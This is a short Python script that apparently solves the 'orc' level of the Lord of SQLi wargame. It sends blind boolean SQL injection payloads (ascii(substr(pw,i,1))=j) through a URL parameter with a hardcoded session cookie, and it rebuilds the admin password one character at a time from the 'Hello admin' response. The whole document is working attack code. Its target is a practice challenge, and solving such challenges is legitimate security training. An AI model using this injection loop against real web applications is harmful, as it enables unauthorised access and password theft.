import requests

url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw=1' or id='admin' and "
cookie = dict(PHPSESSID="2fe29pshtdqrc7jtiuetqrncb9")
pw = ""
for i in range(1,9):
    for j in range(32, 128):
        param = f"ascii(substr(pw,{i},1))={j} -- "
        path = url+param
        print (path)
        response = requests.get(path, cookies=cookie)
        if response.text.find("Hello admin") > 0:
            print(j)
            pw += chr(j)
            break
print(pw)